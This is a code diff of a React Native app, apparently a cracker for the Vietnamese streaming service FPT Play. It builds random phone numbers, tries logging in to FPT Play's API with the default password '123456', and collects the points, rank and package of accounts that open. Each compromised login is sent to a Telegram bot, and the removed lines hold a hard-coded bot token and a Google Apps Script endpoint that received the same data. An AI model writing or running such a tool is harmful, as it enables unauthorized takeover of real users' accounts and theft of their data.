@@ -52,9 +52,9 @@ export default function FptPlay() {
     '099',
     '059',
   ];
-  var element = '0';
+  const [element, setElement] = useState([]);
   const [headNumber, setHeadNumber] = useState('0');
-  const [sl, setSL] = useState();
+  const [sl, setSL] = useState(1);
   const [botToken, setBotToken] = useState('');
   const [chatId, setChatID] = useState('');
   const [hit, setHit] = useState(0);
@@ -71,19 +71,17 @@ export default function FptPlay() {
       // saving error
     }
   };
+
   const getData = async () => {
     try {
       const jsonValue = await AsyncStorage.getItem('@hit');
       // return jsonValue != null ? JSON.parse(jsonValue) : null;
-      console.log('a ' + JSON.stringify(jsonValue));
-      var length = JSON.parse(jsonValue).length;
+      console.log(JSON.parse(jsonValue));
       if (JSON.parse(jsonValue).length == 0) {
         return;
       }
-      const data = JSON.stringify(jsonValue);
-      const jsonData = JSON.parse(data);
-      console.log(' ' + jsonData);
-      console.log('c' + jsonData[0].login);
+      const jsonData = JSON.parse(jsonValue);
+      var length = JSON.parse(jsonValue).length;
       for (let index = 0; index < length; index++) {
         const newItem = {
           login: jsonData[index].login,
@@ -96,9 +94,9 @@ export default function FptPlay() {
         array.push(newItem);
         setSuccess(Array.from(array));
       }
-      // setDisabled(true);
-      var h = hit + data.length;
+      var h = hit + jsonData.length - 1;
       setHit((h = h + 1));
+      // setDisabled(true);
     } catch (e) {
       // error reading value
     }
@@ -121,14 +119,14 @@ export default function FptPlay() {
             setHeadNumber(title);
           }}
         />
-        <TextInput
+        {/* <TextInput
           placeholder="Số lượng scan"
           placeholderTextColor={'#D3D3D3'}
           style={styles.textInput}
           onChangeText={title => {
             setSL(title);
           }}
-        />
+        /> */}
         <TextInput
           placeholder="BotToken"
           placeholderTextColor={'#D3D3D3'}
@@ -179,18 +177,37 @@ export default function FptPlay() {
         <TouchableOpacity
           style={styles.Button}
           onPress={() => {
-            var SoLan = 0;
-            while (SoLan < sl) {
-              console.log('\n');
-              console.log('\n');
-              Logic();
-              SoLan++;
+            if (
+              botToken.length == 0 ||
+              chatId.length == 0 ||
+              botToken == undefined ||
+              chatId == undefined
+            ) {
+              alert('Bạn chưa nhập bot Token hoặc chat id của telegram');
+              return;
+            } else {
+              for (let index = 0; index < 10; index++) {
+                var phoneNumber = '';
+                if (headNumber != undefined) {
+                  phoneNumber = headNumber;
+                } else if (headNumber == undefined) {
+                  var i = Math.floor(Math.random() * (number.length - 1));
+                  phoneNumber = number[i];
+                }
+                for (let index = 0; index < 10 - headNumber.length; index++) {
+                  phoneNumber = phoneNumber + Math.floor(Math.random() * 10);
+                }
+                console.log(phoneNumber);
+              }
             }
           }}>
           <Text style={{fontSize: 20}}>Bắt đầu Scan</Text>
         </TouchableOpacity>
         <TouchableOpacity
-          onPress={() => getData()}
+          onPress={() => {
+            getData();
+            setDisabled(true);
+          }}
           style={styles.Button}
           disabled={disabled}>
           <Text style={{fontSize: 20}}>Load data</Text>
@@ -224,16 +241,8 @@ export default function FptPlay() {
     var rank = '';
     var thongTin = '';
     //bắt đầu
-    if (headNumber != undefined) {
-      element = headNumber;
-    } else if (headNumber == undefined) {
-      var i = Math.floor(Math.random() * (number.length - 1));
-      element = number[i];
-    }
-    for (let index = 0; index < 10 - headNumber.length; index++) {
-      element = element + Math.floor(Math.random() * 10);
-    }
-    element = '0981446695';
+
+    // element = '0981446695';
     console.log(element);
     //login
     fetch(
@@ -339,7 +348,6 @@ export default function FptPlay() {
         console.error(error);
       })
       .done();
-
     function getInfo(thongTin) {
       fetch(
         'https://api.fptplay.net/apiloy/v1_w/user/point?token=undefined&st=r6JBUel-WJyemw_Kp3fwWg&e=1616082981592&device=Chrome(version:89)',
@@ -440,36 +448,13 @@ export default function FptPlay() {
               var h = hit;
               setHit((h = h + 1));
               storeData(success);
-              if (
-                botToken.length == 0 ||
-                chatId.length == 0 ||
-                botToken == undefined ||
-                chatId == undefined
-              ) {
-                // fetch(
-                //   `https://api.telegram.org/bot5154543105:AAHZFTA9W-2oPwnS7Me8MVx4Auo-ksho2n0/sendMessage?chat_id=-1001500499183&text=FPT Play | ${element}:123456 | Point: ${point} | Rank: ${rank}| INFO: ${thongTin}`,
-                // )
-                //   .catch(error => {
-                //     console.error(error);
-                //   })
-                //   .done();
-                // fetch(
-                //   `https://script.google.com/macros/s/AKfycbxlT6gdrCLKqYuzRHOxhtmxBBY5ktrLkdiVpZMdptUoAc4I6mZF_cSbTCGOcRK1SJ2Z/exec?action=create&LOGIN=${element}:123456&point=${point}&rank_name=${rank}&package=${thongTin}`,
-                // )
-                //   .catch(error => {
-                //     console.error(error);
-                //   })
-                //   .done();
-                alert('Bạn chưa nhập bot Token hoặc chat id của telegram');
-              } else {
-                fetch(
-                  `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=FPT Play | ${element}:123456 | Point: ${point} | Rank: ${rank}| INFO: ${thongTin}`,
-                )
-                  .catch(error => {
-                    console.error(error);
-                  })
-                  .done();
-              }
+              fetch(
+                `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=FPT Play | ${element}:123456 | Point: ${point} | Rank: ${rank}| INFO: ${thongTin}`,
+              )
+                .catch(error => {
+                  console.error(error);
+                })
+                .done();
               console.log(thongTin);
             }
           }
